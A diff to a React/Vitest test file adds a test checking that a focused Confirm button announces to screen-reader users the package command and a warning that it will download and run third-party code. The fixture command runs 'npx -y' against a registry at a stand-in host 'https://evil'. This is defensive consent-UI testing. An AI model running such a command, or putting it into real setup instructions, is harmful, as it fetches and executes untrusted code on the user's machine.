@@ -1105,6 +1105,53 @@ describe("Workspace sessions", () => {
     expect(sessionCreate).not.toHaveBeenCalled();
   });
 
+  it("names the command and the download in Confirm's accessible description", async () => {
+    vi.mocked(providersList).mockResolvedValue({
+      providers: [grokProvider, npxProvider],
+      unreadableDirs: 0,
+    });
+    root = createRoot(container);
+    await act(async () => {
+      root.render(<Workspace />);
+    });
+    await act(async () => undefined);
+
+    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
+    if (newWorkspace === null) throw new Error("new workspace control did not render");
+    await act(async () => newWorkspace.click());
+    await act(async () => undefined);
+
+    const codexOption = Array.from(
+      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
+    ).find((button) => button.textContent?.includes("codex-acp"));
+    if (codexOption === undefined) throw new Error("codex-acp option did not render");
+    await act(async () => codexOption.click());
+    await act(async () => undefined);
+
+    // Focus lands on Confirm when the card opens, so its description is the
+    // whole of what a screen-reader user hears before approving a package
+    // download. Resolve the ids to their TEXT rather than asserting the
+    // attribute exists: the spoken words are the thing under test, and an
+    // aria-describedby pointing at a missing or empty node announces nothing
+    // while still satisfying an attribute check.
+    const confirm = Array.from(container.querySelectorAll<HTMLButtonElement>("button")).find(
+      (button) => button.textContent?.trim() === "Confirm",
+    );
+    if (confirm === undefined) throw new Error("Confirm did not render");
+    expect(document.activeElement).toBe(confirm);
+
+    const described = (confirm.getAttribute("aria-describedby") ?? "")
+      .split(/\s+/)
+      .filter((id) => id.length > 0)
+      .map((id) => container.querySelector(`#${id}`)?.textContent ?? "")
+      .join(" ");
+
+    expect(described).toContain(
+      "npx -y @agentclientprotocol/codex-acp@1.10.0 --registry=https://evil",
+    );
+    expect(described).toContain("download and run third-party code");
+  });
+
   it("Confirm on consent panel calls create exactly once", async () => {
     vi.mocked(providersList).mockResolvedValue({
       providers: [grokProvider, npxProvider],
